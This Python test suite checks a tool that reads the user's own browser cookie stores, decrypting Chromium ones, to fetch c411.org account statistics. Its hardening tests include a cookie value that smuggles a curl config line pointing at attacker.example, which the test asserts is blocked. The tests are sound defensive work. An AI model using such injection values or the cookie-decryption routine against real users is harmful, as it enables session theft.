"""bin/c411trend-fetch against synthetic browser profiles.

Every test builds a throwaway $HOME holding real SQLite cookie stores
(Chromium ones encrypted the way Chromium does it), and puts stub `curl`,
`secret-tool` and `xdg-settings` first on $PATH:

- curl answers "authenticated" when the cookie value starts with `live-`
  (echoing it back as the username) and logs every call;
- secret-tool returns passwords from $STUB_SECRETS ("app=pw,app=pw");
- xdg-settings prints $STUB_DEFAULT as the default browser's .desktop.

Run: python3 -m unittest discover -s test
"""

import hashlib
import json
import os
import sqlite3
import subprocess
import sys
import tempfile
import time
import unittest

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

HERE = os.path.dirname(os.path.abspath(__file__))
FETCH = os.path.join(HERE, "..", "bin", "c411trend-fetch")

STUBS = {
    "curl": r"""#!/bin/sh
cfg=$(cat)
echo "$*" >> "$STUB_LOG"
printf '%s' "$cfg" > "$STUB_LOG.config"
case "$STUB_MODE" in
  big) head -c 2000000 /dev/zero | tr '\\0' ' '; exit 0 ;;
  slow) sleep 30; exit 0 ;;
  http403) echo "curl: (22) The requested URL returned error: 403" >&2; exit 22 ;;
  nan) printf '{"authenticated":true,"user":{"username":"x","uploaded":"NaN","downloaded":-5}}'; exit 0 ;;
  strtrue) printf '{"authenticated":"true","user":{"username":"x","uploaded":1,"downloaded":1}}'; exit 0 ;;
  weirdname) printf '{"authenticated":true,"user":{"username":"<b>x</b>\\u0007\\nevil","uploaded":1,"downloaded":1,"canDownload":"yes"}}'; exit 0 ;;
esac
case "$cfg" in
  *session=live-*) user=$(printf '%s' "$cfg" | sed -n 's/.*session=\(live-[a-z0-9-]*\).*/\1/p')
    printf '{"authenticated":true,"user":{"username":"%s","uploaded":"2000","downloaded":1000,"ratio":2}}' "$user" ;;
  *) printf '{"authenticated":false,"user":null}' ;;
esac
""",
    "secret-tool": r"""#!/bin/sh
IFS=,
for pair in $STUB_SECRETS; do
  [ "${pair%%=*}" = "$3" ] && { printf '%s\n' "${pair#*=}"; exit 0; }
done
exit 1
""",
    "xdg-settings": r"""#!/bin/sh
printf '%s\n' "$STUB_DEFAULT"
""",
}


def pbkdf2(pw):
    return hashlib.pbkdf2_hmac("sha1", pw, b"saltysalt", 1, 16)


def chromium_encrypt(value, host, prefix=b"v10", password=b"peanuts"):
    plain = hashlib.sha256(host.encode()).digest() + value.encode()
    pad = 16 - len(plain) % 16
    plain += bytes([pad]) * pad
    enc = Cipher(algorithms.AES(pbkdf2(password)), modes.CBC(b" " * 16)).encryptor()
    return prefix + enc.update(plain) + enc.finalize()


class FetchTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.home = os.path.join(self.tmp.name, "home")
        os.makedirs(self.home)
        self.bin = os.path.join(self.tmp.name, "stubs")
        os.makedirs(self.bin)
        for name, body in STUBS.items():
            path = os.path.join(self.bin, name)
            with open(path, "w") as fh:
                fh.write(body)
            os.chmod(path, 0o755)
        self.log = os.path.join(self.tmp.name, "curl.log")
        self.secrets = ""
        self.default = ""
        self.mode = ""
        self.runtime = os.path.join(self.tmp.name, "run")
        os.makedirs(self.runtime, mode=0o700)
        self.clock = time.time() - 1000

    def tearDown(self):
        self.tmp.cleanup()

    # -- fixtures --

    def _touch(self, path):
        # Deterministic "most recently used" order: each new store is newer.
        self.clock += 10
        os.utime(path, (self.clock, self.clock))

    def chromium(self, root, profile="Default", value="live-a", prefix=b"v10", password=b"peanuts",
                 host=".c411.org", in_root=False, expires=0):
        d = os.path.join(self.home, root) if in_root else os.path.join(self.home, root, profile)
        os.makedirs(os.path.join(d, "Network"), exist_ok=True)
        db = os.path.join(d, "Network", "Cookies")
        con = sqlite3.connect(db)
        con.execute("create table meta(key text, value text)")
        con.execute("insert into meta values('version', '24')")
        con.execute("create table cookies(name text, value text, encrypted_value blob, host_key text, "
                    "last_access_utc integer, expires_utc integer)")
        if value is not None:
            con.execute("insert into cookies values('session', '', ?, ?, 1, ?)",
                        (chromium_encrypt(value, host, prefix, password), host, expires))
        con.execute("insert into cookies values('other', '', ?, 'example.org', 1, 0)", (chromium_encrypt("nope", "example.org"),))
        con.commit()
        con.close()
        self._touch(db)
        return db

    def firefox(self, root, profile="abcd1234.default-release", rows=(("session", "live-f", ""),)):
        d = os.path.join(self.home, root, profile)
        os.makedirs(d, exist_ok=True)
        db = os.path.join(d, "cookies.sqlite")
        con = sqlite3.connect(db)
        con.execute("create table moz_cookies(name text, value text, host text, originAttributes text, "
                    "lastAccessed integer, expiry integer)")
        for i, row in enumerate(rows):
            name, value, attrs = row[:3]
            expiry = row[3] if len(row) > 3 else 0
            con.execute("insert into moz_cookies values(?, ?, '.c411.org', ?, ?, ?)", (name, value, attrs, i, expiry))
        con.commit()
        con.close()
        self._touch(db)
        return db

    # -- running --

    def run_fetch(self, *args):
        env = {
            "HOME": self.home,
            "PATH": self.bin + ":/usr/bin:/bin",
            "XDG_STATE_HOME": os.path.join(self.home, ".local/state"),
            "XDG_CONFIG_HOME": os.path.join(self.home, ".config"),
            "STUB_LOG": self.log,
            "STUB_SECRETS": self.secrets,
            "STUB_DEFAULT": self.default,
            "STUB_MODE": self.mode,
            "XDG_RUNTIME_DIR": self.runtime,
        }
        # sys.executable, not the shebang: CI installs `cryptography` into the
        # interpreter running the tests, which may not be /usr/bin/python3.
        argv = [sys.executable, FETCH, *args] if "--record" in args else [sys.executable, FETCH, "--no-record", *args]
        argv = [a for a in argv if a != "--record"]
        out = subprocess.run(argv, capture_output=True, text=True, env=env, timeout=60)
        self.assertEqual(out.stderr, "")
        return json.loads(out.stdout)

    def api_calls(self):
        try:
            with open(self.log) as fh:
                return len(fh.readlines())
        except FileNotFoundError:
            return 0

    def curl_argv(self):
        with open(self.log) as fh:
            return fh.readline().split()

    def curl_config(self):
        with open(self.log + ".config") as fh:
            return fh.read()

    def history(self):
        try:
            with open(os.path.join(self.home, ".local/state/c411trend/history.jsonl")) as fh:
                return [json.loads(l) for l in fh]
        except FileNotFoundError:
            return []

    # -- tests --

    def test_auto_prefers_default_browser(self):
        self.chromium(".config/BraveSoftware/Brave-Browser", value="live-brave")
        self.firefox(".mozilla/firefox", rows=(("session", "live-firefox", ""),))  # newer, but not default
        self.default = "brave-browser.desktop"
        res = self.run_fetch()
        self.assertTrue(res["ok"], res)
        self.assertEqual(res["user"]["username"], "live-brave")
        self.assertEqual(res["source"], {"browser": "brave", "label": "Brave", "profile": "Default"})

    def test_auto_falls_through_to_another_browser(self):
        self.chromium(".config/BraveSoftware/Brave-Browser", value=None)  # default, but never logged in
        self.firefox(".config/mozilla/firefox", rows=(("session", "live-xdg", ""),))  # new XDG location
        self.default = "brave-browser.desktop"
        res = self.run_fetch()
        self.assertEqual(res["user"]["username"], "live-xdg")
        self.assertEqual(res["source"]["browser"], "firefox")
        self.assertEqual(res["source"]["profile"], "default-release")

    def test_expired_session_moves_on_to_next_store(self):
        self.chromium(".config/google-chrome", value="dead-chrome")
        self.chromium(".config/chromium", value="live-chromium")
        self.default = "google-chrome.desktop"
        res = self.run_fetch()
        self.assertEqual(res["user"]["username"], "live-chromium")
        self.assertEqual(self.api_calls(), 2)

    def test_gives_up_after_three_stale_sessions(self):
        for root in (".config/google-chrome", ".config/chromium", ".config/vivaldi", ".config/thorium"):
            self.chromium(root, value="dead-x")
        res = self.run_fetch()
        self.assertFalse(res["ok"])
        self.assertEqual(res["error"], "expired")
        self.assertEqual(self.api_calls(), 3)
        self.assertIn("session expired", res["message"])

    def test_remembers_the_store_that_worked(self):
        self.chromium(".config/BraveSoftware/Brave-Browser", value="dead-brave")
        self.firefox(".zen", rows=(("session", "live-zen", ""),))
        self.default = "brave-browser.desktop"
        self.assertEqual(self.run_fetch()["user"]["username"], "live-zen")
        self.assertEqual(self.api_calls(), 2)
        self.assertEqual(self.run_fetch()["user"]["username"], "live-zen")
        self.assertEqual(self.api_calls(), 3)  # straight to Zen the second time

    def test_opera_keeps_its_profile_in_the_root(self):
        self.chromium(".config/opera", value="live-opera", in_root=True)
        res = self.run_fetch("--browser", "opera")
        self.assertEqual(res["user"]["username"], "live-opera")
        self.assertEqual(res["source"]["profile"], "Default")

    def test_flatpak_vivaldi_with_keyring_key(self):
        self.chromium(".var/app/com.vivaldi.Vivaldi/config/vivaldi", value="live-viv", prefix=b"v11", password=b"s3cret")
        self.secrets = "chrome=wrong,vivaldi=s3cret"
        self.default = "com.vivaldi.Vivaldi.desktop"
        res = self.run_fetch()
        self.assertEqual(res["user"]["username"], "live-viv")

    def test_edge_v11_without_keyring_uses_empty_password(self):
        self.chromium(".config/microsoft-edge", value="live-edge", prefix=b"v11", password=b"")
        res = self.run_fetch("--browser", "edge")
        self.assertEqual(res["user"]["username"], "live-edge")

    def test_wrong_keyring_password_is_a_keyring_error(self):
        self.chromium(".config/BraveSoftware/Brave-Browser", value="live-b", prefix=b"v11", password=b"right")
        self.secrets = "brave=wrong"
        res = self.run_fetch("--browser", "brave")
        self.assertFalse(res["ok"])
        self.assertEqual(res["error"], "keyring")
        self.assertIn("Brave Safe Storage", res["message"])
        self.assertEqual(self.api_calls(), 0)

    def test_firefox_prefers_non_container_cookie(self):
        self.firefox(".mozilla/firefox", rows=(("session", "dead-container", "^userContextId=2"), ("session", "live-plain", "")))
        res = self.run_fetch("--browser", "firefox")
        self.assertEqual(res["user"]["username"], "live-plain")

    def test_profile_filter(self):
        self.chromium(".config/chromium", profile="Default", value="live-default")
        self.chromium(".config/chromium", profile="Profile 2", value="live-p2")
        self.assertEqual(self.run_fetch("--browser", "chromium", "--profile", "Default")["user"]["username"], "live-default")
        self.assertEqual(self.run_fetch("--browser", "chromium")["user"]["username"], "live-p2")  # newest first

    def test_no_browser_at_all(self):
        res = self.run_fetch()
        self.assertEqual(res["error"], "no-browser")
        self.assertIn("File", res["message"])

    def test_browsers_without_c411_cookie(self):
        self.chromium(".config/chromium", value=None)
        self.firefox(".librewolf", rows=())
        res = self.run_fetch()
        self.assertEqual(res["error"], "no-cookie")
        self.assertIn("Chromium", res["message"])
        self.assertIn("LibreWolf", res["message"])
        self.assertEqual(self.api_calls(), 0)

    def test_file_mode(self):
        os.makedirs(os.path.join(self.home, ".config/c411trend"))
        with open(os.path.join(self.home, ".config/c411trend/cookie"), "w") as fh:
            fh.write("Cookie: a=b; session=live-file\n")
        res = self.run_fetch("--browser", "file")
        self.assertEqual(res["user"]["username"], "live-file")

    def test_list_does_not_call_the_api(self):
        self.chromium(".config/BraveSoftware/Brave-Browser")
        self.firefox(".floorp")
        self.default = "floorp.desktop"
        res = self.run_fetch("--list")
        self.assertEqual(res["default"], "floorp")
        self.assertEqual([s["browser"] for s in res["stores"]], ["floorp", "brave"])
        self.assertEqual(self.api_calls(), 0)

    # -- hardening --

    def write_cookie_file(self, text, mode=0o600):
        d = os.path.join(self.home, ".config/c411trend")
        os.makedirs(d, exist_ok=True)
        path = os.path.join(d, "cookie")
        with open(path, "w") as fh:
            fh.write(text)
        os.chmod(path, mode)
        return path

    def test_newline_in_cookie_cannot_inject_curl_config(self):
        self.write_cookie_file('session=live-a; evil=x\nurl = "http://attacker.example/"; b="q\\"')
        res = self.run_fetch("--browser", "file")
        self.assertEqual(res["user"]["username"], "live-a")
        config = self.curl_config()  # the stub's $(cat) drops the final newline
        self.assertNotIn("\n", config)
        self.assertNotIn("attacker", config)
        self.assertEqual(config, 'header = "Cookie: session=live-a"')

    def test_decrypted_cookie_with_control_chars_is_dropped(self):
        self.chromium(".config/chromium", value="live-a\r\nx: y")
        res = self.run_fetch("--browser", "chromium")
        self.assertEqual(res["error"], "no-cookie")
        self.assertEqual(self.api_calls(), 0)

    def test_curl_ignores_curlrc_and_is_https_only(self):
        self.write_cookie_file("session=live-a")
        self.run_fetch("--browser", "file")
        argv = self.curl_argv()
        self.assertEqual(argv[0], "-q")
        self.assertIn("--proto =https", " ".join(argv))
        self.assertIn("--max-redirs 0", " ".join(argv))
        self.assertEqual(argv[-1], "https://c411.org/api/auth/me")
        self.assertNotIn("live-a", " ".join(argv))  # cookie only ever on stdin

    def test_oversized_response_is_rejected(self):
        self.write_cookie_file("session=live-a")
        self.mode = "big"
        res = self.run_fetch("--browser", "file")
        self.assertEqual(res["error"], "bad-response")

    def test_slow_response_is_cut_off(self):
        self.write_cookie_file("session=live-a")
        self.mode = "slow"
        start = time.monotonic()
        res = self.run_fetch("--browser", "file", "--timeout", "1")
        self.assertEqual(res["error"], "bad-response")
        self.assertLess(time.monotonic() - start, 15)

    def test_http_error_is_reported_cleanly(self):
        self.write_cookie_file("session=live-a")
        self.mode = "http403"
        res = self.run_fetch("--browser", "file")
        self.assertEqual(res["error"], "network")
        self.assertIn("403", res["message"])

    def test_invalid_numbers_are_rejected_and_not_recorded(self):
        self.write_cookie_file("session=live-a")
        self.mode = "nan"
        res = self.run_fetch("--browser", "file", "--record")
        self.assertEqual(res["error"], "bad-response")
        self.assertEqual(self.history(), [])

    def test_authenticated_must_be_a_real_boolean(self):
        self.write_cookie_file("session=live-a")
        self.mode = "strtrue"
        self.assertEqual(self.run_fetch("--browser", "file")["error"], "expired")

    def test_username_is_sanitised(self):
        self.write_cookie_file("session=live-a")
        self.mode = "weirdname"
        res = self.run_fetch("--browser", "file")
        self.assertEqual(res["user"]["username"], "<b>x</b> evil")  # QML shows it as plain text
        self.assertIsNone(res["user"]["canDownload"])

    def test_expired_cookies_are_not_sent(self):
        past = int((time.time() - 3600 + 11644473600) * 1_000_000)
        self.chromium(".config/chromium", value="live-old", expires=past)
        self.firefox(".mozilla/firefox", rows=(("session", "live-oldff", "", int((time.time() - 60) * 1000)),))
        res = self.run_fetch()
        self.assertEqual(res["error"], "no-cookie")
        self.assertEqual(self.api_calls(), 0)

    def test_future_expiry_is_kept(self):
        future = int((time.time() + 86400 + 11644473600) * 1_000_000)
        self.chromium(".config/chromium", value="live-new", expires=future)
        self.assertEqual(self.run_fetch("--browser", "chromium")["user"]["username"], "live-new")

    def test_cookie_copies_stay_in_runtime_dir_and_are_removed(self):
        stale = os.path.join(self.runtime, "c411trend-stale")
        os.makedirs(stale)
        os.utime(stale, (time.time() - 3600, time.time() - 3600))
        fresh = os.path.join(self.runtime, "c411trend-inflight")  # another run, still working
        os.makedirs(fresh)
        self.chromium(".config/chromium", value="live-a")
        self.run_fetch("--browser", "chromium")
        self.assertEqual(sorted(os.listdir(self.runtime)), ["c411trend-inflight"])

    def test_cookie_file_is_tightened_and_symlinks_refused(self):
        path = self.write_cookie_file("session=live-a", mode=0o644)
        self.run_fetch("--browser", "file")
        self.assertEqual(os.stat(path).st_mode & 0o777, 0o600)
        os.unlink(path)
        target = os.path.join(self.tmp.name, "elsewhere")
        with open(target, "w") as fh:
            fh.write("session=live-a")
        os.symlink(target, path)
        self.assertEqual(self.run_fetch("--browser", "file")["error"], "no-cookie")

    def test_recorded_history_is_private(self):
        self.chromium(".config/chromium", value="live-a")
        self.run_fetch("--record")
        self.run_fetch("--record")
        state = os.path.join(self.home, ".local/state/c411trend")
        for name in ("history.jsonl", "history.jsonl.lock", "source"):
            self.assertEqual(os.stat(os.path.join(state, name)).st_mode & 0o777, 0o600, name)
        self.assertEqual(os.stat(state).st_mode & 0o777, 0o700)
        self.assertEqual(os.stat(os.path.join(state, "history.jsonl")).st_mode & 0o777, 0o600)
        h = self.history()
        self.assertEqual(len(h), 2)
        self.assertEqual(h[0]["up"], 2000.0)


    # -- language --

    def test_messages_follow_lang(self):
        self.chromium(".config/chromium", value="dead-a")
        self.assertIn("session expired", self.run_fetch("--browser", "chromium")["message"])
        self.assertIn("session C411 expirée", self.run_fetch("--browser", "chromium", "--lang", "fr")["message"])
        self.assertIn("session expirée", self.run_fetch("--browser", "chromium", "--lang", "fr")["message"])
        res = self.run_fetch("--browser", "vivaldi", "--lang", "fr")
        self.assertIn("aucun profil Vivaldi", res["message"])

    def test_file_label_is_translated(self):
        self.write_cookie_file("session=live-a")
        self.assertEqual(self.run_fetch("--browser", "file", "--lang", "fr")["source"]["label"], "Fichier")
        self.assertEqual(self.run_fetch("--browser", "file")["source"]["label"], "File")


class MessageCatalogTest(unittest.TestCase):
    def test_every_message_has_both_languages_with_the_same_placeholders(self):
        import importlib.machinery
        import importlib.util
        import re
        loader = importlib.machinery.SourceFileLoader("c411trend_fetch_msgs", FETCH)
        spec = importlib.util.spec_from_loader("c411trend_fetch_msgs", loader)
        m = importlib.util.module_from_spec(spec)
        loader.exec_module(m)
        holes = lambda s: re.findall(r"%[sd]", s)
        for key, (en, fr) in m.MESSAGES.items():
            self.assertTrue(en and fr, key)
            self.assertEqual(holes(en), holes(fr), key)
        used = set(re.findall(r'msg\("([a-z-]+)"', open(FETCH).read()))
        self.assertEqual(used - set(m.MESSAGES), set())       # nothing used that is missing
        self.assertEqual(set(m.MESSAGES) - used, set())       # nothing left unused


class HistoryCompactionTest(unittest.TestCase):
    """thin() and compact_history() called in-process on a private state dir."""

    def setUp(self):
        import importlib.machinery
        import importlib.util
        self.tmp = tempfile.TemporaryDirectory()
        os.environ["XDG_STATE_HOME"] = self.tmp.name
        loader = importlib.machinery.SourceFileLoader("c411trend_fetch", FETCH)
        spec = importlib.util.spec_from_loader("c411trend_fetch", loader)
        self.m = importlib.util.module_from_spec(spec)
        loader.exec_module(self.m)

    def tearDown(self):
        del os.environ["XDG_STATE_HOME"]
        self.tmp.cleanup()

    def test_thin_keeps_recent_manual_and_one_per_bucket(self):
        now = 2_000_000_000
        day = 86400
        old = [{"t": now - 200 * day + i * 1800, "up": i, "down": 1} for i in range(48)]  # one day, 30 min apart
        manual = [{"t": now - 300 * day, "up": 1, "down": 1, "manual": True}]
        recent = [{"t": now - 10 * day + i * 1800, "up": i, "down": 1} for i in range(10)]
        kept = self.m.thin(old + manual + recent, now)
        self.assertEqual(len([s for s in kept if s in old]), 4 + (1 if (old[0]["t"] % (6 * 3600)) else 0))
        self.assertIn(manual[0], kept)
        for s in recent:
            self.assertIn(s, kept)
        self.assertEqual(kept, sorted(kept, key=lambda s: s["t"]))

    def test_compaction_is_atomic_and_drops_garbage(self):
        m = self.m
        m.ensure_state_dir()
        now = 2_000_000_000
        with open(m.HISTORY, "w") as fh:
            for i in range(1000):
                fh.write(json.dumps({"t": now - 400 * 86400 + i * 600, "up": i, "down": 1}) + "\n")
            fh.write("garbage\n")
            fh.write('{"t": 5, "up": "NaN", "down": 1}\n')
            fh.write(json.dumps({"t": now, "up": 5, "down": 1}) + "\n")
        with m.HistoryLock():
            m.compact_history(now)
        with open(m.HISTORY) as fh:
            lines = [json.loads(l) for l in fh]
        self.assertLess(len(lines), 50)
        self.assertEqual(lines[-1]["t"], now)
        self.assertEqual([f for f in os.listdir(os.path.dirname(m.HISTORY)) if f.startswith(".history-")], [])


if __name__ == "__main__":
    unittest.main()
